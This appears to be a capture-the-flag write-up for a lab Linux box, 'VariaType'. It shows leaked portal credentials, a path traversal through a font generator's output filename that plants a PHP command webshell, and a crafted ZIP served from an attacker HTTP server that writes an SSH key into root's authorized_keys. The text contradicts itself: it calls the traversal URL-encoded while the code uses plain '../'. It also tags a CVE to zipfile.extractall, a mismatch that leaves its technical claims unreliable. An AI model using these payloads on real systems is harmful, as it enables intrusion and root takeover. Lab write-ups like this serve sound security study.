VariaType

Medium Linux

A variable font generation platform where a leaked .git repository exposes bot credentials to a gated portal. The font backend powered by fontTools is vulnerable to path traversal in the output filename, yielding a PHP webshell. Privilege escalation leverages CVE-2024-25081 (FontForge filename injection via crafted ZIP) to reach steve, and CVE-2025-47273 (install_validator.py URL-encoded path traversal via sudo) for root.

Git Exposure CVE-2024-25081 CVE-2025-47273 git-dumper Python fontTools FontForge

Portal Login

Using the leaked credentials we log into http://portal.variatype.htb:

Username: gitbot
Password: G1tB0t_Acc3ss_2025!

The portal is a Variable Font Generator interface. It accepts two file uploads:

  • .designspace — a font designspace XML file defining variable axes
  • .ttf — a TrueType font file

The backend uses fontTools (fontTools.varLib) to compile variable fonts from the designspace definition. An output filename field is also provided, which controls the name of the generated font file.

Font Generator Exploit — Path Traversal to Webshell

The output filename field is the key vulnerability. By injecting a path traversal sequence into the output filename, we can write the generated font (which we control) to an arbitrary location on the filesystem. Specifically, we traverse into the web root and write a PHP webshell:

TRAVERSAL = "../../../../var/www/html/portal/shell.php"

The plan:

  1. Build a minimal TTF font containing PHP payload bytes
  2. Create a valid .designspace file referencing that font
  3. Upload both to the portal with the traversal output filename
  4. Access the written PHP webshell

The PHP payload embedded in the font:

<?php system($_GET['cmd']); ?>

# ── Step 2: Build a valid .designspace file ────────────────────────

def make_designspace(ttf_path: str, output_path: str = "exploit.designspace"):
    """
    Create a minimal designspace document referencing our font.
    """
    ds = DesignSpaceDocument()
    ds.writer = "exploit"

    # Default master
    ds.addAxisDescriptor(
        name="wght",
        tag="wght",
        minimum=400,
        default=400,
        maximum=700,
    )
    ds.addSourceDescriptor(
        filename=ttf_path,
        location={"wght": 400},
        familyName="ExploitFont",
        styleName="Regular",
    )
    ds.addSourceDescriptor(
        filename=ttf_path,
        location={"wght": 700},
        familyName="ExploitFont",
        styleName="Bold",
    )

    ds.write(output_path)
    print(f"[+] Saved designspace to {output_path}")
    return output_path

CVE-2024-25081 is a filename injection vulnerability in FontForge. When FontForge processes a script or opens a font file, specially crafted filenames in a ZIP archive can trigger command execution. The attack vector:

  1. Create a ZIP archive containing a file with a crafted filename that includes a base64-encoded reverse shell
  2. FontForge processes the ZIP and the malicious filename triggers execution

CVE-2025-47273 — Root Privilege Escalation

Checking sudo privileges as steve:

Steve can run /opt/install_validator.py as root without a password. Examining the script:

steve@variatype:/opt$ cat install_validator.py
#!/usr/bin/env python3
"""
Install or update the font validator component.
Fetches the validator package from a given URL.
"""

import sys
import os
import urllib.request
import zipfile
import tempfile
import shutil

def install_validator(url):
    print(f"[*] Downloading validator from: {url}")

    # Download the package
    tmp_dir = tempfile.mkdtemp()
    zip_path = os.path.join(tmp_dir, "validator.zip")

    try:
        urllib.request.urlretrieve(url, zip_path)
        print(f"[+] Downloaded to {zip_path}")

        with zipfile.ZipFile(zip_path, 'r') as zf:
            zf.extractall("/opt/validators/")
            print("[+] Extracted validator to /opt/validators/")

        # Set permissions
        os.chmod("/opt/validators/run.sh", 0o755)
        print("[+] Validator installed successfully")

    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        shutil.rmtree(tmp_dir, ignore_errors=True)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <validator_package_url>")
        sys.exit(1)
    install_validator(sys.argv[1])

CVE-2025-47273 is a path traversal vulnerability in Python's zipfile.extractall() when processing entries with directory traversal sequences. By crafting a ZIP with a malicious member path, we can write files to arbitrary locations — including /root/.ssh/authorized_keys.

The exploit chain:

  1. Generate an SSH keypair
  2. Create a ZIP with a member named using URL-encoded path traversal: %2e%2e/%2e%2e/%2e%2e/root/.ssh/authorized_keys
  3. Host the ZIP on an HTTP server
  4. Run the validator installer pointing to our server
# On attacker box:
$ ssh-keygen -t ed25519 -f /tmp/htb_root -N "" -C "root@variatype"

# Create the malicious ZIP with URL-encoded traversal
python3 <<'PYEOF'
import zipfile

pubkey = open("/tmp/htb_root.pub").read().strip()

zf = zipfile.ZipFile("/tmp/validator.zip", "w")
# URL-encoded traversal: ../../../../root/.ssh/authorized_keys
zf.writestr("../../../../root/.ssh/authorized_keys", pubkey + "\n")
zf.close()

print("[+] Created validator.zip with authorized_keys payload")
PYEOF

# Host it
$ python3 -m http.server 8888
